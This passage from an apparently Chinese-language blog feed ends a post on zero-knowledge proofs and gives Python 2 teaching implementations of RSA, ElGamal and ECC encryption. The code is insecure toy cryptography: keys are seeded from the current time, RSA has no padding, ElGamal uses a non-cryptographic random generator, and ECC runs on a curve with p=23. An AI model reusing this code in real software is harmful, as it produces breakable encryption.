B，从而证明自己确实拥有该房间的钥匙。</li></ol><p>后面的方法 2 属于零知识证明。好处在于在整个证明的过程中，B 始终不能看到钥匙的样子，从而避免了钥匙的泄露。</p><p>例 2：A 拥有 B 的公钥，A 没有见过 B，而 B 见过 A 的照片，某天二人偶然碰面，B 认出了 A，但 A 不能确定面前的人是否是 B，这时 B 要向 A 证明自己是 B，也有两个方法：</p><ol><li>B 把自己的私钥给 A，A 用这个私钥对某个数据加密，然后用 B 的公钥解密，如果正确，则证明对方确实是 B。</li><li>A 给出一个随机值，B 用自己的私钥对其加密，然后把加密后的数据交给 A，A 用 B 的公钥解密，如果能够得到原来的随机值，则证明对方是 B。</li></ol><p>后面的方法属于零知识证明。</p><p>有一个缺口环形的长廊，出口和入口距离非常近（在目距之内），但走廊中间某处有一道只能用钥匙打开的门，A 要向 B 证明自己拥有该门的钥匙。采用零知识证明，则 B 看着 A 从入口进入走廊，然后又从出口走出走廊，这时 B 没有得到任何关于这个钥匙的信息，但是完全可以证明 A 拥有钥匙。</p><h1 id="零知识证明一般的过程"><a href="#零知识证明一般的过程" class="headerlink" title="零知识证明一般的过程"></a>零知识证明一般的过程</h1><p>假设有两方人，甲方是证明者，乙方是验证者。他们在一个工作环境内有相同的一组函数和一组数值。证明开始：</p><ol><li>甲方先发送满足条件的随机值给乙方，这个称为承诺。</li><li>乙方发送满足条件的随机值给甲方，这个称为挑战。</li><li>甲方执行一个不让乙方知道的计算，并把计算结果给乙方，这个称为响应。</li><li>乙方对响应进行验证，验证失败就退出，验证成功回到 1，然后继续顺序执行 n 次。</li></ol><p>如果每一次乙方验证都是成功的，那么乙方就相信了和甲方之间的共识。在整个过程中没有透露任何相关秘密信息。</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.jianshu.com/p/3f524c925c34" target="_blank" rel="noopener">https://www.jianshu.com/p/3f524c925c34</a><br><a href="https://blog.csdn.net/liudongdong19/article/details/82884742" target="_blank" rel="noopener">https://blog.csdn.net/liudongdong19/article/details/82884742</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;何为&lt;a href=&quot;https://baike.baidu.com/item/%E9%9B%B6%E7%9F%A5%E8%AF%86%E8%AF%81%E6%98%8E&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;零知识证明&lt;/a&gt;？&lt;/p&gt;
    
    </summary>
    
    
      <category term="blockchain" scheme="https://qianfei11.github.io/tags/blockchain/"/>
    
  </entry>
  
  <entry>
    <title>Python实现RSA、ElGamal、ECC加密解密算法</title>
    <link href="https://qianfei11.github.io/2019/09/25/Python%E5%AE%9E%E7%8E%B0RSA%E3%80%81ElGamal%E3%80%81ECC%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E7%AE%97%E6%B3%95/"/>
    <id>https://qianfei11.github.io/2019/09/25/Python实现RSA、ElGamal、ECC加密解密算法/</id>
    <published>2019-09-25T01:12:10.000Z</published>
    <updated>2019-10-09T02:28:19.996Z</updated>
    
    <content type="html"><![CDATA[<p>最常见的三种公钥密码的 Python 实现。</p><a id="more"></a><h1 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a><a href="https://baike.baidu.com/item/RSA%E7%AE%97%E6%B3%95" target="_blank" rel="noopener">RSA</a></h1><p>RSA 加密算法是一种非对称加密算法。在公开密钥加密和电子商业中 RSA 被广泛使用。RSA 是 1977 年由罗纳德·李维斯特（Ron Rivest）、阿迪·萨莫尔（Adi Shamir）和伦纳德·阿德曼（Leonard Adleman）一起提出的。当时他们三人都在麻省理工学院工作。RSA 就是他们三人姓氏开头字母拼在一起组成的。</p><p>RSA 的安全性依赖于大数分解，但是否等同于大数分解一直未能得到理论上的证明，因为没有证明破解 RSA 就一定需要作大数分解。假设存在一种无须分解大数的算法，那它肯定可以修改成为大数分解算法。 RSA 的一些变种算法已被证明等价于大数分解。不管怎样，分解 n 是最显然的攻击方法。人们已能分解多个十进制位的大素数。因此，模数 n 必须选大一些，因具体适用情况而定。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- encoding=utf-8 -*-</span></span><br><span class="line"><span class="comment"># === Author: assassinq</span></span><br><span class="line"><span class="comment"># === Date: 2019-09-21</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成大素数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_prime</span><span class="params">(rs)</span>:</span></span><br><span class="line">    p = gmpy2.mpz_urandomb(rs, <span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> gmpy2.is_prime(p):</span><br><span class="line">        p = p + <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"><span class="comment"># 产生密钥</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">keygen</span><span class="params">()</span>:</span></span><br><span class="line">    rs = gmpy2.random_state(int(time.time()))</span><br><span class="line">    p = get_prime(rs)</span><br><span class="line">    q = get_prime(rs)</span><br><span class="line">    n = p * q</span><br><span class="line">    e = <span class="number">0x10001</span></span><br><span class="line">    pk = [n, e]</span><br><span class="line">    d = gmpy2.invert(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">    sk = d</span><br><span class="line">    <span class="keyword">return</span> pk, sk</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(m, pk)</span>:</span></span><br><span class="line">    n = pk[<span class="number">0</span>]</span><br><span class="line">    e = pk[<span class="number">1</span>]</span><br><span class="line">    m = libnum.s2n(m)</span><br><span class="line">    <span class="keyword">return</span> gmpy2.powmod(m, e, n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(c, pk, sk)</span>:</span></span><br><span class="line">    n = pk[<span class="number">0</span>]</span><br><span class="line">    d = sk</span><br><span class="line">    m = gmpy2.powmod(c, d, n)</span><br><span class="line">    <span class="keyword">return</span> libnum.n2s(m)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    pk, sk = keygen()</span><br><span class="line">    m = raw_input(<span class="string">'Please input your message:'</span>)</span><br><span class="line">    c = encrypt(m, pk)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'This is ciphertext:'</span>, c</span><br><span class="line">    res = decrypt(c, pk, sk)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'This is plaintext:'</span>, res</span><br></pre></td></tr></table></figure><h1 id="ElGamal"><a href="#ElGamal" class="headerlink" title="ElGamal"></a><a href="https://baike.baidu.com/item/Elgamal" target="_blank" rel="noopener">ElGamal</a></h1><p>在密码学中，ElGamal 加密算法是一个基于迪菲-赫尔曼密钥交换的非对称加密算法。它在 1985 年由塔希尔·盖莫尔提出。GnuPG 和 PGP 等很多密码学系统中都应用到了 ElGamal 算法。<br>ElGamal 加密算法可以定义在任何循环群 G 上。它的安全性取决于循环群 G 上的离散对数难题。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- encoding=utf-8 -*-</span></span><br><span class="line"><span class="comment"># === Author: assassinq</span></span><br><span class="line"><span class="comment"># === Date: 2019-09-25</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成大素数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_prime</span><span class="params">(rs)</span>:</span></span><br><span class="line">    p = gmpy2.mpz_urandomb(rs, <span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> gmpy2.is_prime(p):</span><br><span class="line">        p = p + <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"><span class="comment"># 产生密钥</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">keygen</span><span class="params">()</span>:</span></span><br><span class="line">    rs = gmpy2.random_state(int(time.time()))</span><br><span class="line">    p = get_prime(rs)</span><br><span class="line">    g = random.randrange(<span class="number">0</span>, p)</span><br><span class="line">    x = random.randrange(<span class="number">2</span>, p - <span class="number">1</span>)</span><br><span class="line">    y = gmpy2.powmod(g, x, p)</span><br><span class="line">    pk = [y, g, p]</span><br><span class="line">    sk = x</span><br><span class="line">    <span class="keyword">return</span> pk, sk</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">(plain, pk)</span>:</span></span><br><span class="line">    y = pk[<span class="number">0</span>]</span><br><span class="line">    g = pk[<span class="number">1</span>]</span><br><span class="line">    p = pk[<span class="number">2</span>]</span><br><span class="line">    r = random.randrange(<span class="number">2</span>, p - <span class="number">1</span>)</span><br><span class="line">    c = gmpy2.powmod(g, r, p)</span><br><span class="line">    y_r = gmpy2.powmod(y, r, p)</span><br><span class="line">    m = libnum.s2n(plain)</span><br><span class="line">    cdot = gmpy2.mul(y_r, m) % p</span><br><span class="line">    cipher = [c, cdot]</span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">(cipher, pk, sk)</span>:</span></span><br><span class="line">    y = pk[<span class="number">0</span>]</span><br><span class="line">    g = pk[<span class="number">1</span>]</span><br><span class="line">    p = pk[<span class="number">2</span>]</span><br><span class="line">    x = sk</span><br><span class="line">    c = cipher[<span class="number">0</span>]</span><br><span class="line">    cdot = cipher[<span class="number">1</span>]</span><br><span class="line">    c_x = gmpy2.powmod(c, x, p)</span><br><span class="line">    c_x_ = gmpy2.invert(c_x, p)</span><br><span class="line">    m = gmpy2.mul(cdot, c_x_) % p</span><br><span class="line">    plaintext = libnum.n2s(m)</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    pk, sk = keygen()</span><br><span class="line">    m = raw_input(<span class="string">'Please input your message: '</span>)</span><br><span class="line">    ciphertext = encode(m, pk)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'This is ciphertext:'</span>, ciphertext</span><br><span class="line">    plaintext = decode(ciphertext, pk, sk)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'This is plaintext:'</span>, plaintext</span><br></pre></td></tr></table></figure><h1 id="ECC"><a href="#ECC" class="headerlink" title="ECC"></a><a href="https://baike.baidu.com/item/%E6%A4%AD%E5%9C%86%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95" target="_blank" rel="noopener">ECC</a></h1><p>椭圆曲线密码学（英语：Elliptic curve cryptography，缩写为 ECC），一种建立公开密钥加密的演算法，基于椭圆曲线数学。椭圆曲线在密码学中的使用是在 1985 年由 Neal Koblitz 和 Victor Miller 分别独立提出的。</p><p>ECC 的主要优势是在某些情况下它比其他的方法使用更小的密钥——比如 RSA 加密算法——提供相当的或更高等级的安全。ECC 的另一个优势是可以定义群之间的双线性映射，基于 Weil 对或是 Tate 对；双线性映射已经在密码学中发现了大量的应用，例如基于身份的加密。不过一个缺点是加密和解密操作的实现比其他机制花费的时间长。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- encoding=utf-8 -*-</span></span><br><span class="line"><span class="comment"># === Author: assassinq</span></span><br><span class="line"><span class="comment"># === Date: 2019-9-30</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_param</span><span class="params">(x0, a, b, p)</span>:</span></span><br><span class="line">    y0 = <span class="number">-1</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; p:</span><br><span class="line">        <span class="comment">#print i, p</span></span><br><span class="line">        <span class="keyword">if</span> i ** <span class="number">2</span> % p == (x0 ** <span class="number">3</span> + a * x0 + b) % p:</span><br><span class="line">            y0 = i</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> y0 == <span class="number">-1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">    x1 = x0</span><br><span class="line">    y1 = (-y0) % p</span><br><span class="line">    <span class="keyword">return</span> x0, y0, x1, y1</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_x_y</span><span class="params">(E)</span>:</span></span><br><span class="line">    a = E[<span class="number">0</span>]</span><br><span class="line">    b = E[<span class="number">1</span>]</span><br><span class="line">    p = E[<span class="number">2</span>]</span><br><span class="line">    x_y = []</span><br><span class="line">    idx = <span class="number">0</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; p:</span><br><span class="line">        <span class="comment">#print i, p</span></span><br><span class="line">        val = get_param(i, a, b, p)</span><br><span class="line">        <span class="keyword">if</span> val != <span class="keyword">False</span>:</span><br><span class="line">            x0, y0, x1, y1 = val</span><br><span class="line">            x_y.append((x0, y0))</span><br><span class="line">            idx += <span class="number">1</span></span><br><span class="line">            x_y.append((x1, y1))</span><br><span class="line">            idx += <span class="number">1</span></span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> x_y</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ecc_add</span><span class="params">(G1, G2, E)</span>:</span></span><br><span class="line">    a = E[<span class="number">0</span>]</span><br><span class="line">    p = E[<span class="number">2</span>]</span><br><span class="line">    x1 = G1[<span class="number">0</span>]</span><br><span class="line">    y1 = G1[<span class="number">1</span>]</span><br><span class="line">    x2 = G2[<span class="number">0</span>]</span><br><span class="line">    y2 = G2[<span class="number">1</span>]</span><br><span class="line">    sign = <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">if</span> x1 == x2 <span class="keyword">and</span> y1 == y2:</span><br><span class="line">        numerator = <span class="number">3</span> * (x1 ** <span class="number">2</span>) + a</span><br><span class="line">        denominator = <span class="number">2</span> * y1</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        numerator = y2 - y1</span><br><span class="line">        denominator = x2 - x1</span><br><span class="line">        <span class="keyword">if</span> numerator * denominator &lt; <span class="number">0</span>:</span><br><span class="line">            sign = <span class="keyword">False</span></span><br><span class="line">            numerator = abs(numerator)</span><br><span class="line">            denominator = abs(denominator)</span><br><span class="line">    divisor = gmpy2.gcd(numerator, denominator)</span><br><span class="line">    numerator /= divisor</span><br><span class="line">    denominator /= divisor</span><br><span class="line">    inverse_d = gmpy2.invert(denominator, p)</span><br><span class="line">    lmd = numerator * inverse_d</span><br><span class="line">    <span class="keyword">if</span> sign == <span class="keyword">False</span>:</span><br><span class="line">        lmd = -lmd</span><br><span class="line">    lmd = lmd % p</span><br><span class="line">    x3 = (lmd ** <span class="number">2</span> - x1 - x2) % p</span><br><span class="line">    y3 = (lmd * (x1 - x3) - y1) % p</span><br><span class="line">    <span class="keyword">return</span> (x3, y3)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_rank</span><span class="params">(G, E)</span>:</span></span><br><span class="line">    p = E[<span class="number">2</span>]</span><br><span class="line">    x0 = G[<span class="number">0</span>]</span><br><span class="line">    y0 = G[<span class="number">1</span>]</span><br><span class="line">    x1 = x0</span><br><span class="line">    y1 = (-y0) % p</span><br><span class="line">    tx = x0</span><br><span class="line">    ty = y0</span><br><span class="line">    n = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        n += <span class="number">1</span></span><br><span class="line">        (px, py) = ecc_add((tx, ty), (x0, y0), E)</span><br><span class="line">        <span class="keyword">if</span> px == x1 <span class="keyword">and</span> py == y1:</span><br><span class="line">            <span class="keyword">return</span> n + <span class="number">1</span></span><br><span class="line">        tx = px</span><br><span class="line">        ty = py</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ecc_mul</span><span class="params">(k, G, E, n)</span>:</span></span><br><span class="line">    k = k % n</span><br><span class="line">    x1 = G[<span class="number">0</span>]</span><br><span class="line">    y1 = G[<span class="number">1</span>]</span><br><span class="line">    rx = x1</span><br><span class="line">    ry = y1</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; k - <span class="number">1</span>:</span><br><span class="line">        rx, ry = ecc_add((rx, ry), (x1, y1), E)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> (rx, ry)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">keygen</span><span class="params">()</span>:</span></span><br><span class="line">    a = <span class="number">13</span></span><br><span class="line">    b = <span class="number">22</span></span><br><span class="line">    p = <span class="number">23</span></span><br><span class="line">    <span class="comment">#a = 0</span></span><br><span class="line">    <span class="comment">#b = 7</span></span><br><span class="line">    <span class="comment">#p = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">4</span> * (a ** <span class="number">3</span>) + <span class="number">27</span> * (b ** <span class="number">2</span>)) % p == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'[!] This is not a oval!'</span></span><br><span class="line">        exit()</span><br><span class="line">    E = (a, b, p)</span><br><span class="line">    x_y = get_x_y(E)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(x_y)):</span><br><span class="line">        <span class="keyword">print</span> str(i) + <span class="string">': '</span> + str(x_y[i])</span><br><span class="line">    G = x_y[<span class="number">4</span>]</span><br><span class="line">    <span class="comment">#G = (0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798, 0x483ada7726a3c4655da4fbfc0e1108a8fd17b448a68554199c47d08ffb10d4b8)</span></span><br><span class="line">    n = get_rank(G, E)</span><br><span class="line">    <span class="comment">#n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141</span></span><br><span class="line">    n_B = random.randrange(<span class="number">0</span>, n)</span><br><span class="line">    P_B = ecc_mul(n_B, G, E, n)</span><br><span class="line">    pk = [E, n, G, P_B]</span><br><span class="line">    sk = n_B</span><br><span class="line">    <span class="keyword">return</span> pk, sk</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">(plaintext, pk)</span>:</span></span><br><span class="line">    E = pk[<span class="number">0</span>]</span><br><span class="line">    n = pk[<span class="number">1</span>]</span><br><span class="line">    G = pk[<span class="number">2</span>]</span><br><span class="line">    P_B = pk[<span class="number">3</span>]</span><br><span class="line">    m = libnum.s2n(plaintext)</span><br><span class="line">    k = random.randrange(<span class="number">1</span>, n)</span><br><span class="line">    P1 = ecc_mul(k, G, E, n)</span><br><span class="line">    P2 = ecc_mul(k, P_B, E, n)</span><br><span class="line">    x_y = get_x_y(E)</span><br><span class="line">    Pt = x_y[random.randrange(<span class="number">0</span>, len(x_y) - <span class="number">1</span>)]</span><br><span class="line">    p = E[<span class="number">2</span>]</span><br><span class="line">    C = (m * Pt[<span class="number">0</span>] + Pt[<span class="number">1</span>]) % p</span><br><span class="line">    ciphertext = [P1, ecc_add(Pt, P2, E), C]</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">(ciphertext, pk, sk)</span>:</span></span><br><span class="line">    E = pk[<span class="number">0</span>]</span><br><span class="line">    n = pk[<span class="number">1</span>]</span><br><span class="line">    G = pk[<span class="number">2</span>]</span><br><span class="line">    P_B = pk[<span class="number">3</span>]</span><br><span class="line">    n_B = sk</span><br><span class="line">    P1 = ciphertext[<span class="number">0</span>]</span><br><span class="line">    Pt_kP_B = ciphertext[<span class="number">1</span>]</span><br><span class="line">    C = ciphertext[<span class="number">2</span>]</span><br><span class="line">    n_B_kG = ecc_mul(n_B, P1, E, n)</span><br><span class="line">    p = E[<span class="number">2</span>]</span><br><span class="line">    n_B_kG_ = (n_B_kG[<span class="number">0</span>], (-n_B_kG[<span class="number">1</span>]) % p)</span><br><span class="line">    Pt = ecc_add(Pt_kP_B, n_B_kG_, E)</span><br><span class="line">    xt = Pt[<span class="number">0</span>]</span><br><span class="line">    yt = Pt[<span class="number">1</span>]</span><br><span class="line">    xt_ = gmpy2.invert(xt, p)</span><br><span class="line">    c_yt = gmpy2.sub(C, yt) % p</span><br><span class="line">    m = gmpy2.mul(c_yt, xt_) % p</span><br><span class="line">    plaintext = libnum.n2s(m)</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    pk, sk = keygen()</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'pk ='</span>, pk</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'sk ='</span>, sk</span><br><span class="line">    m = chr(<span class="number">15</span>)</span><br><span class="line">    <span class="comment">#m = raw_input('Please input your message: ')</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'m ='</span>, libnum.s2n(m)</span><br><span class="line">    c = encode(m, pk)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'ciphertext:'</span>, c</span><br><span class="line">    res = decode(c, pk, sk)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'plaintext:'</span>, ord(res)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最常见的三种公钥密码的 Python 实现。&lt;/p&gt;
    
    </summary>
    
    
      <category term="crypto" scheme="https://qianfei11.github.io/tags/crypto/"/>
    
      <category term="python" scheme="https://qianfei11.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>智能合约入门</title>
    <link href="https://qianfei11.github.io/2019/09/22/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%85%A5%E9%97%A8/"/>
    <id>https://qianfei11.github.io/2019/09/22/智能合约入门/</id>
    <published>2019-09-22T11:58:53.000Z</published>
    <updated>2019-10-03T13:18:14.322Z</updated>
    
